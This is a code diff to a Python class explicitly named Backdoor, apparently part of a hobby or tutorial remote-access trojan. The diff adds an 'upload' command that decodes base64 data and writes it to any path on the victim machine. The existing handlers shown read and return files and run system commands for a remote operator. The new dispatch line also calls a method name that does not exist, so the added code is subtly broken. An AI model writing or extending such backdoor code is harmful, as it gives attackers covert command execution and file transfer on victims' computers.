@@ -1,8 +1,8 @@
 import os
 import json
 import socket
-from base64 import b64encode
 import subprocess
+from base64 import b64encode, b64decode
 
 class Backdoor:
     
@@ -30,6 +30,11 @@ class Backdoor:
         os.chdir(path)
         return f'[+] Changing working directory to {path}'
     
+    def write_file(self, path, content):
+        with open(path, 'wb') as file:
+            file.write(b64decode(content))
+            return '[+] Upload successful.'
+
     def read_file(self, path):
         with open(path, 'rb') as file:
             return  b64encode(file.read())
@@ -47,6 +52,9 @@ class Backdoor:
 
             elif command[0].lower() == 'download':
                 command_result = self.read_file(command[1])
+            
+            elif command[0].lower() == 'upload': # ['upload', 'file name', 'file content as binary']
+                command_result = self.write(command[1], command[2])
 
             else:
                 command_result = self.execute_system_command(command)
